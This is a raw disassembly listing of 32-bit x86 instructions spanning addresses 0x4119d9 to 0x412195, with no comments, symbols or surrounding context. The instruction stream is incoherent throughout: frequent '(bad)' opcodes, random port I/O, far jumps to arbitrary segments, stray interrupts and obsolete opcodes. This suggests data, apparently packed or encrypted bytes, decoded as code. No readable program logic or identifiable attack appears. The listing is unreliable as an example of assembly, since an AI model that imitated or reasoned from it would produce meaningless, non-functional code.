  4119d9:	xlat   BYTE PTR ds:[ebx]
  4119da:	lock mov cl,0x38
  4119dd:	lahf   
  4119de:	lods   eax,DWORD PTR fs:[esi]
  4119e0:	xchg   ebp,eax
  4119e1:	jp     0x411a4f
  4119e3:	aaa    
  4119e4:	jae    0x411987
  4119e6:	mov    DWORD PTR [edx+0x3409959d],0x56be562f
  4119f0:	or     BYTE PTR [ecx+eax*4-0x4c],dh
  4119f4:	es (bad) 
  4119f6:	in     eax,0x91
  4119f8:	scas   al,BYTE PTR es:[edi]
  4119f9:	add    eax,0xeaade768
  4119fe:	xchg   esi,eax
  4119ff:	push   edx
  411a00:	or     cl,bh
  411a02:	loope  0x4119a8
  411a04:	push   0xffffff88
  411a06:	push   esp
  411a07:	rcl    dl,cl
  411a09:	dec    eax
  411a0a:	stos   DWORD PTR es:[edi],eax
  411a0b:	jne    0x411a61
  411a0d:	cmp    edx,DWORD PTR [ebp+0x3b3f2198]
  411a13:	mov    cx,0x89b7
  411a17:	in     al,dx
  411a18:	xchg   edx,eax
  411a19:	mov    edx,0xa1819914
  411a1e:	loope  0x411a80
  411a20:	dec    ebx
  411a21:	push   0x30
  411a23:	jmp    0x411a80
  411a25:	and    esp,DWORD PTR [esi-0x1]
  411a28:	or     ebx,DWORD PTR [ecx+0x225ab121]
  411a2e:	call   0x99fa:0xf1c190f0
  411a35:	(bad)  
  411a37:	dec    ebp
  411a38:	addr16 sbb al,0xd0
  411a3b:	push   ecx
  411a3c:	std    
  411a3d:	dec    eax
  411a3e:	jb     0x411a2f
  411a40:	fst    QWORD PTR [edi-0x3]
  411a43:	test   BYTE PTR [ecx+0x26b8d121],cl
  411a49:	in     eax,dx
  411a4a:	jb     0x4119f5
  411a4c:	sar    bl,0x1e
  411a4f:	jge    0x411a7e
  411a51:	mov    ebx,0xff046d54
  411a56:	mov    ebp,0x66e8bc26
  411a5b:	sbb    DWORD PTR [ebp-0x2217d036],0xffffffba
  411a62:	into   
  411a63:	xchg   edi,eax
  411a65:	jle    0x411a18
  411a67:	ret    0xc5f1
  411a6a:	int    0xad
  411a6c:	ret    0xf193
  411a6f:	sub    ebp,DWORD PTR [ecx-0x69]
  411a72:	add    DWORD PTR [ebx+0x24],ebp
  411a75:	jecxz  0x411aae
  411a77:	adc    DWORD PTR [ebx+ecx*4+0x570a9dad],ecx
  411a7e:	or     bl,BYTE PTR [ebx-0x3f6e21da]
  411a84:	test   al,0x4f
  411a86:	jmp    0x411a48
  411a88:	cmp    al,0x1b
  411a8a:	jmp    0x72bb:0xe0c109c6
  411a91:	adc    DWORD PTR [esi+0x66],eax
  411a94:	test   DWORD PTR [ebx],ecx
  411a96:	stos   BYTE PTR es:[edi],al
  411a97:	xchg   ebp,esp
  411a99:	mov    ?,WORD PTR [ebp+0x77]
  411a9c:	sbb    dh,BYTE PTR [eax]
  411a9e:	int    0x34
  411aa0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411aa1:	iret   
  411aa2:	sbb    eax,0xaf62edc6
  411aa7:	cmp    DWORD PTR [edi],edx
  411aa9:	stos   DWORD PTR es:[edi],eax
  411aaa:	jno    0x411a6a
  411aac:	mov    bl,0xa3
  411aae:	ret    
  411aaf:	retf   
  411ab0:	fs jmp 0x411ae9
  411ab3:	in     eax,dx
  411ab4:	pop    ebp
  411ab5:	cmc    
  411ab6:	test   ebx,ecx
  411ab8:	sar    esp,0x92
  411abb:	(bad)  
  411abc:	mov    edi,0x617b0c75
  411ac1:	(bad)  
  411ac2:	ficom  DWORD PTR [ebp-0x72]
  411ac5:	inc    eax
  411ac6:	mov    edi,0x2ea7a9a0
  411acb:	sahf   
  411acc:	adc    eax,ebp
  411ace:	fist   WORD PTR [ebx-0x27]
  411ad1:	stc    
  411ad2:	jno    0x411a82
  411ad4:	pushf  
  411ad5:	ss dec edx
  411ad7:	jb     0x411b28
  411ad9:	inc    eax
  411ada:	(bad)  
  411adb:	daa    
  411adc:	and    DWORD PTR [ebx],esi
  411ade:	imul   esp,DWORD PTR [esi+0x5aef8e30],0x14
  411ae5:	mov    ds:0x4de1ced9,eax
  411aea:	lea    eax,[edi-0x7eb30f91]
  411af0:	jae    0x411aad
  411af2:	clc    
  411af3:	and    DWORD PTR [esi+ebx*4-0xcdfb703],edi
  411afa:	inc    edx
  411afb:	pushf  
  411afc:	ins    BYTE PTR es:[edi],dx
  411afd:	adc    DWORD PTR [ecx],eax
  411aff:	mov    ds:0x897889bc,al
  411b04:	ja     0x411ac8
  411b06:	ss mov eax,0x422019cb
  411b0c:	and    esp,esi
  411b0e:	clc    
  411b0f:	inc    ebp
  411b10:	leave  
  411b11:	in     al,dx
  411b12:	mov    edi,0x2105ec4c
  411b17:	cmp    esi,0x47ee73e8
  411b1d:	out    dx,al
  411b1e:	std    
  411b1f:	mov    BYTE PTR [eax],ch
  411b21:	test   eax,0xbe868d5d
  411b26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b27:	push   esp
  411b28:	add    al,0xb0
  411b2a:	jbe    0x411b98
  411b2c:	retf   
  411b2d:	sbb    DWORD PTR [eax],eax
  411b2f:	mov    eax,0x22a866c3
  411b34:	imul   ebx,DWORD PTR [ebx+0x49],0xffffff80
  411b38:	cmp    bl,cl
  411b3a:	push   0x4b584c1
  411b3f:	repz fild WORD PTR [ebp+0x75]
  411b43:	pop    edx
  411b44:	pop    ds
  411b45:	adc    eax,0x60285467
  411b4a:	enter  0xc206,0xfb
  411b4e:	sbb    DWORD PTR [edi+0x2fbb2da3],esp
  411b54:	and    eax,0x117b390d
  411b59:	pop    ds
  411b5a:	sbb    al,0x11
  411b5c:	lock and DWORD PTR [ebp-0x43],edx
  411b60:	adc    al,0xf8
  411b62:	xor    BYTE PTR [edi-0x3927183f],al
  411b68:	cmp    ah,BYTE PTR [edx+edi*2]
  411b6b:	adc    al,0x6f
  411b6d:	and    eax,0xa7eb7f2b
  411b72:	dec    ebx
  411b73:	out    0x2a,eax
  411b75:	sar    DWORD PTR [ebp+edi*8+0x7a],0x89
  411b7a:	les    esi,FWORD PTR [edi+0x65]
  411b7d:	stos   DWORD PTR es:[edi],eax
  411b7e:	jne    0x411b50
  411b80:	int3   
  411b81:	nop
  411b82:	xchg   eax,esi
  411b84:	jbe    0x411b95
  411b86:	mul    DWORD PTR [edi+0x5f9bb89a]
  411b8c:	xor    dl,al
  411b8e:	xor    DWORD PTR [edi-0x3acaf694],esp
  411b94:	imul   ecx,DWORD PTR [ecx-0x132f81c4],0x66
  411b9b:	jge    0x411bd4
  411b9d:	popf   
  411b9e:	lahf   
  411b9f:	add    al,0x8e
  411ba1:	std    
  411ba2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ba3:	cmp    edi,DWORD PTR [edi]
  411ba5:	int    0xc2
  411ba7:	xor    esi,DWORD PTR [edx+0x17]
  411baa:	or     edi,DWORD PTR [ebx+0x65f233e7]
  411bb0:	shr    BYTE PTR [edx],0x11
  411bb3:	shl    bh,0x89
  411bb6:	and    edi,DWORD PTR [ecx+0x7a]
  411bb9:	(bad)  
  411bba:	mov    bh,0x96
  411bbc:	fiadd  DWORD PTR [esi+0x7f9ff9c2]
  411bc2:	sbb    eax,0xb5ce11ed
  411bc7:	fisub  DWORD PTR [edx-0x42]
  411bca:	gs shl esi,1
  411bcd:	cmp    eax,DWORD PTR [ebp-0x39fe7ac]
  411bd3:	xor    al,bh
  411bd5:	das    
  411bd6:	cmp    eax,0x6617abca
  411bdb:	or     edx,ebx
  411bdd:	add    al,0x6b
  411bdf:	dec    ebx
  411be0:	frstor ds:0xa0d7246f
  411be6:	in     eax,0xb3
  411be8:	bound  ebx,QWORD PTR [edx+0x376cdab]
  411bee:	pop    edx
  411bef:	rcr    BYTE PTR [ebp+0x23],cl
  411bf2:	mov    bh,0x0
  411bf4:	inc    edx
  411bf5:	repnz inc ebx
  411bf7:	pop    ebp
  411bf8:	sub    BYTE PTR [ebx+0x7bc18193],ah
  411bfe:	(bad)  
  411bff:	cli    
  411c00:	shr    BYTE PTR [edi-0x15],1
  411c03:	or     DWORD PTR [ebx],ecx
  411c05:	adc    ebx,DWORD PTR [ecx]
  411c07:	gs pop eax
  411c09:	xchg   ebx,eax
  411c0a:	pusha  
  411c0b:	popa   
  411c0c:	cmp    BYTE PTR [esi+eiz*8+0x72],al
  411c10:	push   edx
  411c11:	mov    DWORD PTR [ecx-0x5b567894],esp
  411c17:	lods   al,BYTE PTR ds:[esi]
  411c18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c19:	jns    0x411c8c
  411c1b:	stos   BYTE PTR es:[edi],al
  411c1c:	inc    eax
  411c1d:	in     al,0xf9
  411c1f:	in     eax,0x37
  411c21:	not    DWORD PTR [ebp-0x37eee712]
  411c27:	or     ebp,DWORD PTR [edx+eax*1+0x26]
  411c2b:	popaw  
  411c2d:	add    dh,BYTE PTR [edi]
  411c2f:	xor    BYTE PTR [ebp+0x56],0xc0
  411c33:	out    dx,eax
  411c34:	mov    cl,0xe5
  411c36:	retf   0xce31
  411c39:	hlt    
  411c3a:	cld    
  411c3b:	add    BYTE PTR [eax-0x5b],al
  411c3e:	out    0x7b,eax
  411c40:	jne    0x411c24
  411c42:	mov    edi,ds
  411c44:	lods   al,BYTE PTR ds:[esi]
  411c45:	mov    edx,0x974e67b0
  411c4a:	(bad)  
  411c4b:	sbb    ecx,DWORD PTR [ebp-0x2c]
  411c4e:	cmp    BYTE PTR [ebp-0x33],dl
  411c51:	test   BYTE PTR [esi+0x1be61a2],al
  411c57:	or     BYTE PTR [edx],bh
  411c59:	(bad)  
  411c5a:	pop    esp
  411c5b:	mov    dl,0xe7
  411c5d:	inc    eax
  411c5e:	xor    cl,BYTE PTR [esi-0x3]
  411c61:	add    edx,DWORD PTR [eax+ebx*2]
  411c64:	push   edx
  411c65:	in     eax,dx
  411c66:	cli    
  411c67:	rcr    DWORD PTR [edx+0x5e9fb296],1
  411c6d:	adc    edx,edx
  411c6f:	pop    ecx
  411c70:	addr16 xchg edx,eax
  411c72:	mov    eax,0xaa8725be
  411c77:	xor    BYTE PTR [ecx+0x221af3f1],cl
  411c7d:	dec    edi
  411c7e:	pop    edi
  411c7f:	dec    esi
  411c80:	sbb    eax,0x819fd4ca
  411c85:	in     eax,0xd1
  411c87:	imul   edi,DWORD PTR [ebx],0xffffff81
  411c8a:	(bad)  
  411c8b:	enter  0x49,0xa5
  411c8f:	int3   
  411c90:	out    dx,al
  411c91:	mov    cl,0xc2
  411c93:	idiv   BYTE PTR [edx]
  411c95:	test   DWORD PTR [esi],ebp
  411c97:	fld    TBYTE PTR [ebx+eax*4+0x3f]
  411c9b:	retf   0xca73
  411c9e:	mov    ebp,0xc4d8fc80
  411ca3:	cmp    ebx,DWORD PTR [esi-0x70]
  411ca6:	mov    ecx,0x8b87d36
  411cab:	xor    BYTE PTR [eax],0xdf
  411cae:	inc    ebp
  411caf:	ss adc eax,esi
  411cb2:	push   esp
  411cb3:	pop    ds
  411cb4:	add    dl,BYTE PTR [eax+0x2d]
  411cb7:	cmp    al,0x3d
  411cb9:	push   edi
  411cba:	es ins BYTE PTR es:[edi],dx
  411cbc:	pop    ecx
  411cbd:	pop    eax
  411cbe:	jb     0x411cc4
  411cc0:	jmp    0xbec5:0x7af702ff
  411cc7:	iret   
  411cc8:	jmp    0x9fbb2e7
  411ccd:	or     esp,ecx
  411ccf:	or     ah,BYTE PTR [eax]
  411cd1:	sub    eax,0xa0134d99
  411cd6:	adc    BYTE PTR [esp+esi*1-0x70455564],0x8b
  411cde:	pop    eax
  411cdf:	fcmovnbe st,st(4)
  411ce1:	lahf   
  411ce2:	ins    DWORD PTR es:[edi],dx
  411ce3:	mov    eax,ds:0xa08a3f77
  411ce8:	or     DWORD PTR [esp+esi*4-0x44],0xffffffb3
  411ced:	mov    edi,0x5c1b6ee7
  411cf2:	pop    eax
  411cf3:	in     eax,0x85
  411cf5:	popa   
  411cf6:	stos   BYTE PTR es:[edi],al
  411cf7:	inc    eax
  411cf8:	sub    al,0xac
  411cfa:	xlat   BYTE PTR ds:[ebx]
  411cfb:	fs pop edi
  411cfd:	or     eax,0x12722d47
  411d02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d03:	stos   BYTE PTR es:[edi],al
  411d04:	add    DWORD PTR [ebx],ebp
  411d06:	sbb    ch,BYTE PTR [eax-0x4cb1b9ff]
  411d0c:	dec    ebx
  411d0d:	shl    BYTE PTR [esi-0x442f72b7],1
  411d13:	xor    cl,BYTE PTR [edx+0x5d]
  411d16:	retf   
  411d17:	in     al,0x3e
  411d19:	fidivr DWORD PTR ds:0xc089fa7c
  411d1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d20:	data16 jae 0x411d5f
  411d23:	mov    bh,ah
  411d25:	mov    eax,0x830b84ba
  411d2a:	lock icebp 
  411d2c:	sti    
  411d2d:	xchg   ecx,eax
  411d2e:	mov    ds:0xf50738bc,al
  411d33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d35:	rcl    eax,0x3e
  411d38:	ret    0x855f
  411d3b:	(bad)  
  411d3c:	hlt    
  411d3d:	mov    esp,0xa0195cc4
  411d42:	std    
  411d43:	dec    ecx
  411d44:	arpl   sp,si
  411d46:	mov    ebx,0x6ba160d6
  411d4b:	call   0xdf8b:0x48b089aa
  411d52:	mov    al,0xbc
  411d54:	cwde   
  411d55:	and    eax,0x4236f9c
  411d5a:	sub    al,0x4
  411d5c:	add    eax,0xadedad80
  411d61:	test   al,0xcd
  411d63:	sub    al,0xd7
  411d65:	neg    edx
  411d67:	jecxz  0x411dd0
  411d69:	addr16 mov ch,0x3b
  411d6c:	push   ss
  411d6d:	fisubr DWORD PTR [edx+0x49]
  411d70:	bound  edi,QWORD PTR [eax-0x2caeee8f]
  411d76:	push   esi
  411d77:	stc    
  411d78:	mov    esi,0x21ca56d4
  411d7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d7e:	stc    
  411d7f:	jbe    0x411d1b
  411d81:	push   ss
  411d82:	shl    DWORD PTR [ebx+0x20],cl
  411d85:	sub    al,BYTE PTR [esi]
  411d87:	fwait
  411d88:	xor    eax,0x950f7516
  411d8d:	push   eax
  411d8e:	pop    eax
  411d8f:	and    edi,DWORD PTR [edx+ecx*4+0x67c295a2]
  411d96:	in     al,0x65
  411d98:	fsubr  st(2),st
  411d9a:	out    0x70,eax
  411d9c:	ss ss xchg esi,eax
  411d9f:	xchg   esp,eax
  411da0:	ins    BYTE PTR es:[edi],dx
  411da1:	pop    ss
  411da2:	dec    esi
  411da3:	or     edi,edx
  411da5:	loope  0x411d32
  411da7:	adc    ecx,edi
  411da9:	jl     0x411d87
  411dab:	push   ds
  411dac:	or     edi,DWORD PTR [esi]
  411dae:	sub    cl,ah
  411db0:	cli    
  411db1:	cli    
  411db2:	rcr    BYTE PTR [esi],1
  411db4:	push   eax
  411db5:	xchg   edi,eax
  411db6:	mov    edi,0x358153ca
  411dbb:	(bad)  
  411dbc:	mov    ds:0x64950042,eax
  411dc1:	add    BYTE PTR [eax],al
  411dc3:	mov    DWORD PTR [ebp-0x8],0xf89c85ba
  411dca:	sub    ecx,0x160a
  411dd0:	jmp    0x414158
  411dd5:	adc    eax,0x1bd93348
  411dda:	lea    ecx,[ebx+0x2fbe3784]
  411de0:	cmp    edi,DWORD PTR [eax+esi*2+0x3c]
  411de4:	fdiv   DWORD PTR [ebp+0x177a7a82]
  411dea:	pop    edi
  411deb:	jp     0x411e67
  411ded:	adc    al,0xfd
  411def:	sbb    bh,BYTE PTR [edx+0x44]
  411df2:	push   ss
  411df3:	(bad)  
  411df4:	mov    ebp,DWORD PTR [esp+edx*4+0x30f6c59e]
  411dfb:	mov    ds:0x3421b99c,eax
  411e00:	jo     0x411da5
  411e02:	scas   eax,DWORD PTR es:[edi]
  411e03:	add    DWORD PTR ds:0x3c1d6d60,esi
  411e09:	mov    ?,WORD PTR [esi-0x3f]
  411e0c:	shr    DWORD PTR ss:[edi],cl
  411e0f:	sub    BYTE PTR [ecx],dl
  411e11:	xor    BYTE PTR [edx-0x517bb7ef],bl
  411e17:	cdq    
  411e18:	pushf  
  411e19:	aaa    
  411e1a:	ds retf 0x60c0
  411e1e:	sub    dl,BYTE PTR [eax+0x242920e0]
  411e24:	int3   
  411e25:	into   
  411e26:	ja     0x411e74
  411e28:	sbb    ch,BYTE PTR [ecx-0x53]
  411e2b:	pop    esi
  411e2c:	pusha  
  411e2d:	push   edx
  411e2e:	mov    al,0xe1
  411e30:	repnz and al,0xb2
  411e33:	adc    DWORD PTR [ebx-0x78],esi
  411e36:	sub    DWORD PTR [si+0x7d],ebx
  411e3a:	mov    eax,0xaa148c6
  411e3f:	or     ebx,eax
  411e41:	jnp    0x411e91
  411e43:	out    0x57,al
  411e45:	iret   
  411e46:	outs   dx,DWORD PTR ds:[esi]
  411e47:	outs   dx,BYTE PTR ds:[esi]
  411e48:	or     DWORD PTR [edx],edi
  411e4a:	xor    dh,dl
  411e4c:	jns    0x411e43
  411e4e:	push   cs
  411e4f:	in     eax,0x3e
  411e51:	jmp    0x4adced4d
  411e56:	popa   
  411e57:	pop    ecx
  411e58:	shr    DWORD PTR [eax+0x2d],1
  411e5b:	pop    es
  411e5c:	add    ah,BYTE PTR [edx]
  411e5e:	das    
  411e5f:	rcl    DWORD PTR [ebp+0x16],1
  411e62:	imul   eax,DWORD PTR [ebx-0x5e],0xffffffdd
  411e66:	adc    bh,bh
  411e68:	das    
  411e69:	fnsetpm(287 only) 
  411e6b:	pop    ecx
  411e6c:	das    
  411e6d:	fisttp DWORD PTR [ebx+0x6b6f57ca]
  411e73:	jmp    0x411ec8
  411e75:	std    
  411e76:	mov    eax,0xf2407fbf
  411e7b:	xchg   edx,eax
  411e7c:	jae    0x411e2b
  411e7e:	loope  0x411e2d
  411e80:	iret   
  411e81:	mov    al,0x4e
  411e83:	mov    edx,gs
  411e85:	ret    0x2aed
  411e88:	call   0x658c3dfc
  411e8d:	sbb    ebx,0x576543d4
  411e93:	mov    esp,0xfbdcdbda
  411e98:	jecxz  0x411e9a
  411e9a:	jmp    0x1b687a62
  411e9f:	xor    al,0x8d
  411ea1:	dec    BYTE PTR [edx-0x6ce81b9]
  411ea7:	into   
  411ea8:	and    BYTE PTR [eax],cl
  411eaa:	fld    QWORD PTR [esp+ecx*1]
  411ead:	imul   esp,ebx,0x6a9acbe7
  411eb3:	aas    
  411eb4:	or     eax,0x5d463260
  411eb9:	adc    edx,DWORD PTR [edx]
  411ebb:	and    ebx,DWORD PTR [esp+ebx*2+0x1b]
  411ebf:	push   0xffffffa2
  411ec1:	cwde   
  411ec2:	or     BYTE PTR [ebx],cl
  411ec4:	scas   eax,DWORD PTR es:[edi]
  411ec5:	int    0x48
  411ec7:	out    0xf6,eax
  411ec9:	shl    ch,0x1c
  411ecc:	(bad)  
  411ecd:	fist   WORD PTR [edx+0x3f]
  411ed0:	cmp    DWORD PTR [edi-0x2a11c1ae],eax
  411ed6:	xchg   eax,esi
  411ed8:	and    esi,0x58
  411edb:	dec    ebp
  411edc:	push   esi
  411edd:	or     eax,0x403abf42
  411ee2:	pop    ds
  411ee3:	(bad)  
  411ee4:	stos   DWORD PTR es:[edi],eax
  411ee5:	(bad)  [ebx-0x17]
  411ee8:	and    esp,esp
  411eea:	xor    eax,0xbc7e981e
  411eef:	xor    eax,0x36c74949
  411ef4:	call   0x256f8a6f
  411ef9:	fstp   QWORD PTR [ebx]
  411efb:	mov    dh,0xec
  411efd:	sub    bl,BYTE PTR [ebp*1+0x76a280b9]
  411f04:	dec    ebp
  411f05:	cdq    
  411f06:	mov    esp,0xae33d86d
  411f0b:	call   0x41612663
  411f10:	mov    bl,0x49
  411f12:	jno    0x411f31
  411f14:	jbe    0x411f4a
  411f16:	add    DWORD PTR [ebx],0xf62308f8
  411f1c:	sub    DWORD PTR [eax],edi
  411f1e:	and    al,0x7d
  411f20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f21:	and    esi,DWORD PTR [eax-0xf8e78d0]
  411f27:	or     ah,ah
  411f29:	stos   BYTE PTR es:[edi],al
  411f2a:	lods   al,BYTE PTR ds:[esi]
  411f2b:	jnp    0x411f63
  411f2d:	in     eax,dx
  411f2e:	ins    DWORD PTR es:[edi],dx
  411f2f:	fcomp  DWORD PTR [edx]
  411f31:	les    eax,FWORD PTR [ebp+0x6577342]
  411f37:	test   al,0xd0
  411f39:	push   edx
  411f3a:	lock mov WORD PTR [eax+eax*1-0x821a85],es
  411f42:	std    
  411f43:	mov    eax,ds:0xdc22340e
  411f48:	(bad)  
  411f49:	jbe    0x411ef6
  411f4b:	add    ebx,DWORD PTR [ebx-0x449e2b2c]
  411f51:	mov    cl,0x59
  411f53:	je     0x411fd1
  411f55:	push   ss
  411f56:	fdivr  st(3),st
  411f58:	jecxz  0x411f6c
  411f5a:	f2xm1  
  411f5c:	sahf   
  411f5d:	mov    ebp,0x6a924460
  411f62:	jb     0x411ef7
  411f64:	dec    si
  411f66:	xchg   ecx,eax
  411f67:	repnz push 0x4e
  411f6a:	fnstsw WORD PTR [ebx-0x64]
  411f6d:	mov    cs,ebp
  411f6f:	mov    esp,0xdba1afb1
  411f74:	or     al,0xc5
  411f76:	int3   
  411f77:	mov    ds:0xc4f01e3b,al
  411f7c:	retf   
  411f7d:	lea    esi,[esi+0x7bc1e3cd]
  411f83:	jge    0x411feb
  411f85:	pop    edi
  411f86:	push   ds
  411f87:	ret    0xc153
  411f8a:	dec    edi
  411f8b:	bound  esi,QWORD PTR [ecx+0x2f]
  411f8e:	pop    esi
  411f8f:	outs   dx,DWORD PTR ds:[esi]
  411f90:	cmp    eax,0x7876cd4e
  411f95:	in     eax,dx
  411f96:	xor    dh,BYTE PTR [esi*4-0x68871aa2]
  411f9d:	mov    eax,ds:0x3d8fa4bb
  411fa2:	in     al,dx
  411fa3:	(bad)  
  411fa4:	(bad)  
  411fa6:	pop    ebx
  411fa7:	or     BYTE PTR [edi+0xc8a3112],0x59
  411fae:	cmp    al,0x10
  411fb0:	push   esp
  411fb1:	adc    ebx,eax
  411fb3:	(bad)  
  411fb4:	(bad)  
  411fb5:	add    DWORD PTR [edi+0x12],ecx
  411fb8:	and    al,0x71
  411fba:	cmp    dl,BYTE PTR [ebx-0x14319c34]
  411fc0:	or     eax,0x5f7b2798
  411fc5:	repz jb 0x411fa2
  411fc8:	push   ds
  411fc9:	push   0x3acd8f50
  411fce:	or     ebx,DWORD PTR [esi-0x4fd61bbd]
  411fd4:	cmc    
  411fd5:	jp     0x412040
  411fd7:	add    DWORD PTR [esi+0x59],ebx
  411fda:	adc    eax,0x132e36eb
  411fdf:	cs xchg edx,eax
  411fe1:	dec    edi
  411fe2:	push   0x7e
  411fe4:	mov    edx,0x80d6443e
  411fe9:	inc    edx
  411fea:	or     eax,0x5fc2a577
  411fef:	mov    dl,0x76
  411ff1:	mov    dl,0x70
  411ff3:	dec    eax
  411ff4:	xor    esp,DWORD PTR [ebx+0x17]
  411ff7:	and    BYTE PTR [esp+esi*1-0x37d032a8],al
  411ffe:	lock inc edi
  412000:	in     eax,0xd1
  412002:	cwde   
  412003:	adc    eax,DWORD PTR [ebx]
  412005:	stc    
  412006:	adc    ch,BYTE PTR [edi]
  412008:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412009:	lock stos BYTE PTR es:[edi],al
  41200b:	mov    WORD PTR [eax],cs
  41200d:	pusha  
  41200e:	cwde   
  41200f:	mov    esp,0x902cec6c
  412014:	add    eax,0x68e791b
  412019:	push   ss
  41201a:	dec    ebp
  41201b:	(bad)  
  41201c:	jns    0x412076
  41201e:	cld    
  41201f:	mov    edx,0x4422ae8d
  412024:	ja     0x411fdc
  412026:	add    BYTE PTR [ebp-0x48d57ef3],bl
  41202c:	pushf  
  41202d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41202e:	push   esi
  41202f:	xchg   edi,eax
  412030:	push   edx
  412031:	jo     0x411fc9
  412033:	mov    ah,0x8d
  412035:	mov    ah,0xbd
  412037:	mov    eax,0xf95b8509
  41203c:	dec    edx
  41203d:	push   0x6075aede
  412042:	fwait
  412043:	sbb    BYTE PTR [edx-0x6bfe85e6],dl
  412049:	sti    
  41204a:	(bad)  
  41204b:	pusha  
  41204c:	lods   al,BYTE PTR ds:[esi]
  41204d:	inc    ebx
  41204e:	lahf   
  41204f:	and    eax,0xca7c16c
  412054:	mov    bl,0x14
  412056:	outs   dx,DWORD PTR cs:[esi]
  412058:	cs dec ebx
  41205a:	aad    0x5e
  41205c:	and    eax,0xcefdf813
  412061:	add    bh,BYTE PTR [edi-0x25]
  412064:	into   
  412065:	rcl    ch,0x66
  412068:	sbb    dl,BYTE PTR [ecx-0x2d34796f]
  41206e:	out    dx,eax
  41206f:	jle    0x412008
  412071:	icebp  
  412072:	test   DWORD PTR [ebx+0xf816a63],0x3fec203e
  41207c:	ret    
  41207d:	scas   eax,DWORD PTR es:[edi]
  41207e:	mov    edi,0x3c259a9c
  412083:	pop    eax
  412084:	inc    esi
  412085:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412086:	pushf  
  412087:	in     al,0xde
  412089:	adc    esi,esp
  41208b:	pop    edx
  41208c:	(bad)  
  41208d:	jl     0x412027
  41208f:	sbb    BYTE PTR [esi],cl
  412091:	mov    BYTE PTR [ecx],dl
  412093:	imul   ebp,esi,0x75
  412096:	xchg   esp,eax
  412097:	retf   
  412098:	lods   eax,DWORD PTR ss:[esi]
  41209a:	icebp  
  41209b:	xchg   edx,eax
  41209c:	scas   eax,DWORD PTR es:[edi]
  41209d:	mov    edi,DWORD PTR [edx]
  41209f:	leave  
  4120a0:	inc    edi
  4120a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4120a2:	imul   ebp,DWORD PTR [ebp+0x7f],0xffffffd3
  4120a6:	(bad)  
  4120a7:	jecxz  0x412032
  4120a9:	arpl   WORD PTR [edi],bp
  4120ab:	in     al,dx
  4120ac:	cmp    eax,0x91c5b2e6
  4120b1:	xchg   DWORD PTR [eax-0x39],esp
  4120b4:	push   cs
  4120b5:	clc    
  4120b6:	mov    dh,0xa
  4120b8:	fld    DWORD PTR [ecx]
  4120ba:	or     al,0x2d
  4120bc:	add    DWORD PTR [esi],ebp
  4120be:	(bad)  
  4120bf:	xor    DWORD PTR [edi+0x3c],esp
  4120c2:	outs   dx,BYTE PTR ds:[esi]
  4120c3:	cmp    al,0x67
  4120c5:	leave  
  4120c6:	fist   WORD PTR [di]
  4120c9:	hlt    
  4120ca:	add    BYTE PTR [eax],dl
  4120cc:	enter  0x700b,0x3b
  4120d0:	in     eax,dx
  4120d1:	or     eax,0x123c508f
  4120d6:	and    DWORD PTR [ebp-0x161ce7b],ebx
  4120dc:	retf   
  4120dd:	bound  esi,QWORD PTR [ecx-0x171f5382]
  4120e3:	jns    0x412116
  4120e5:	jmp    0x72b3:0x33b3d063
  4120ec:	add    DWORD PTR [esi+ecx*2],esi
  4120ef:	mov    ebp,0x4caa5e4d
  4120f4:	cmp    ecx,eax
  4120f6:	inc    ecx
  4120f7:	arpl   WORD PTR [eax+eax*8],si
  4120fa:	jl     0x4120e3
  4120fc:	out    0x9,al
  4120fe:	push   ebp
  4120ff:	push   cs
  412100:	pop    ecx
  412101:	sbb    al,0x37
  412103:	sub    ch,al
  412105:	loope  0x41217e
  412107:	jmp    0x41213c
  412109:	or     dl,0x74
  41210c:	inc    eax
  41210d:	rcr    dh,1
  41210f:	sub    al,0x14
  412111:	mov    ecx,eax
  412113:	aaa    
  412114:	lahf   
  412115:	push   ss
  412116:	jmp    0x39fa0379
  41211b:	sbb    esp,DWORD PTR [esi+0x732d3b24]
  412121:	sbb    eax,0xca542bbe
  412126:	sub    BYTE PTR [edx+esi*1-0x23],dl
  41212a:	xchg   DWORD PTR [ecx],esp
  41212c:	fmul   QWORD PTR [esi-0x2a]
  41212f:	aas    
  412130:	pop    esp
  412131:	dec    ebx
  412132:	jns    0x41212f
  412134:	pop    es
  412135:	aaa    
  412136:	sahf   
  412137:	std    
  412138:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412139:	cmp    BYTE PTR [ecx+ecx*8],dh
  41213c:	mov    edi,0x20c318b4
  412141:	(bad)
  412145:	xor    ax,0x2712
  412149:	sbb    BYTE PTR [ebx],al
  41214b:	jle    0x412140
  41214d:	push   cs
  41214e:	cdq    
  41214f:	add    eax,0x8a68772f
  412154:	xor    BYTE PTR [edx],0x41
  412157:	scas   al,BYTE PTR es:[edi]
  412158:	push   ebp
  412159:	mov    cl,0xa
  41215b:	por    mm7,QWORD PTR [edi-0x45]
  41215f:	ret    
  412160:	pusha  
  412161:	or     DWORD PTR [ebx-0x2d],eax
  412164:	jns    0x412195
  412166:	pop    edi
  412167:	js     0x41213d
  412169:	cmp    ebp,DWORD PTR [ebx]
  41216b:	push   edi
  41216c:	in     al,0x23
  41216e:	inc    ecx
  41216f:	dec    ebp
  412170:	dec    eax
  412171:	and    dh,bl
  412173:	jne    0x412197
  412175:	iret   
  412176:	push   cs
  412177:	shr    BYTE PTR [ebx-0x34ef1582],1
  41217d:	jmp    0x8fff:0xc40026c6
  412184:	loope  0x412123
  412186:	push   0xffffffe7
  412188:	adc    esi,DWORD PTR [eax+0x56]
  41218b:	mul    ah
  41218d:	dec    edi
  41218e:	cmp    dl,bl
  412190:	xchg   edx,eax
  412191:	jae    0x412123
  412193:	pop    edx
  412194:	outs   dx,BYTE PTR ds:[esi]
  412195:	cdq    
